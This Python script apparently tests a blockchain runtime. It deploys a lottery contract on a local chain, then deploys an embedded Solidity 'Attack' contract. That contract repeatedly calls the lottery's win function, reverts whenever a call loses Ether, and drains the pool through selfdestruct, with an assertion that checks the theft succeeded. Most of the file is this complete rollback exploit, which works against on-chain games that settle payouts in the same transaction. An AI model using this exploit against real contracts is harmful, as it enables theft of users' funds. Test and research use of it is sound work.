# author cswmchen
# date   15-11-21
# usage  python -m runtimeTest.rollback --overwrite --langArgs="--EOAonly"

import os
import json
from utils import cmdLine, runRPC, deploy_contract, activate_contract, prtInfo, prtDeug, compile_source_file, evm2ewasm

expAgentSol = '''
contract Attack {
    address adr_ins;
    address owner;
    
    constructor(address addr){
        adr_ins = addr;
        owner = msg.sender;
    }
    

    function getBalance(address addr) public view returns (uint){
        return address(addr).balance;
    }
    
    function intra(uint256 i) public payable{
        uint256 beforeBalance = this.balance;
        adr_ins.call.value(msg.value)(bytes4(sha3("win(uint256)")), i);
        if (this.balance < beforeBalance)
            revert();
    }    
    
    function hack() public payable{
        require (msg.value >= 1 ether);
        for (uint256 i = 0; i < 100;++i)
        {
            if (this.call.value(msg.value)(bytes4(sha3("intra(uint256)")), i%10))
                break;
        }
    }
    
    function collect() payable public{
        require(msg.sender == owner);
        selfdestruct(owner);
    }
    function () payable{
    }
}
'''

def transferEther(w3, _from, _to, _value):
    _tx_hash = w3.eth.sendTransaction({'from':_from, 'to': _to, 'value': _value}) 
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

def main():
    args = cmdLine()
    w3 = runRPC()
    solPath = "./contracts/lottery.sol"
    if w3.eth.get_balance(w3.eth.accounts[1]) <  w3.toWei(2, 'ether'):
        transferEther(w3, w3.eth.accounts[0], w3.eth.accounts[1], w3.toWei(2, 'ether'))
   
    metadataPath = solPath[:-4] + '.json'
    if os.path.exists(metadataPath) and not args.overwrite:
        with open(metadataPath, 'r') as f:
            obj = json.load(f)
            victimAddr = obj['addr']
            contractABI = obj['abi']
    else:
        cmrt = compile_source_file(solPath, version='0.4.25')
        contractHex = cmrt['bin']#'0x'+cmrt['bin'] if cmrt['bin'][:2] != '0x' else cmrt['bin']
        contractABI =  cmrt['abi']
        # contractEwasm = contractHex 
        contractEwasm = evm2ewasm(contractHex, args)
        victimAddr = deploy_contract(w3, w3.eth.accounts[0], contractABI, contractEwasm)

        with open(metadataPath, 'w') as f:
            json.dump({'abi':contractABI, 'hex':contractHex, 'bin': contractEwasm , 'addr':victimAddr}, f)

    with open('./t.wasm', 'wb') as f:
        f.write(w3.eth.getCode(victimAddr))

    # init victim 
    victim = activate_contract(w3, victimAddr, contractABI)
    # creator set the pool as 1 ether
    while w3.eth.get_balance(victimAddr) <= 0:
        _tx_hash = victim.functions.win(0).transact({'from':w3.eth.accounts[0], 'value': w3.toWei(1, 'ether'), 'gas':300000000}) 
        _ = w3.eth.wait_for_transaction_receipt(_tx_hash)
    
    existingPoolSize = w3.eth.get_balance(victimAddr) # current pool size

    # deploy atkAgent
    with open('.tmp.sol', 'w') as f:
        f.write(expAgentSol)
    cmrt = compile_source_file('.tmp.sol', version='0.4.24')
    atkAgentAddr = deploy_contract(w3, w3.eth.accounts[1], cmrt['abi'], cmrt['bin'], victimAddr) # owner
    atkAgent = activate_contract(w3, atkAgentAddr, cmrt['abi'])

    prtInfo(f"=========================== initial states ================================")   
    prtDeug(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    prtDeug(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")
    prtDeug(f"Balance@attacker={w3.eth.get_balance(w3.eth.accounts[1])/1e18} Ether")

    prtInfo(f"\nattacking...")   
    _tx_hash = atkAgent.functions.hack().transact({'from':w3.eth.accounts[1], 'value': w3.toWei(1, 'ether'), 'gas':300000000}) # attacker hacks the lottery
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)
    
    prtInfo(f"=========================== exploited ================================")    
    prtDeug(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    prtDeug(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")
    assert w3.eth.get_balance(atkAgentAddr) == existingPoolSize + w3.toWei(1, 'ether'), "Fail to steal Ether from the victim"

    _tx_hash = atkAgent.functions.collect().transact({'from':w3.eth.accounts[1], 'gas':300000000}) # attacker hacks the lottery
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

    prtDeug(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    prtDeug(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")
    prtDeug(f"Balance@attacker={w3.eth.get_balance(w3.eth.accounts[1])/1e18} Ether")
    
    prtInfo("PASSED")
main()


